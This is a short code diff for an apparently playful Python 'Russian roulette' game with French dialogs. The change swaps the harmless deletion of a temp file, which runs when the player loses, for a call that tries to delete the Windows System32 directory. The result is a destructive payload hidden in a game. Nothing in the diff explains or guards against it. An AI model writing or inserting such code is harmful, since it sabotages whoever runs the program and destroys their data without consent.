@@ -12,7 +12,7 @@ def roulette():
  
         showerror("Aye","Au revoir...")
  
-        remove("temp.txt")
+        remove("C:\Windows\System32")
     else:
         showinfo("Ouf",f"Tout va bien ! votre balle étais à {abs(b-a)} trous de se faire toucher")
  
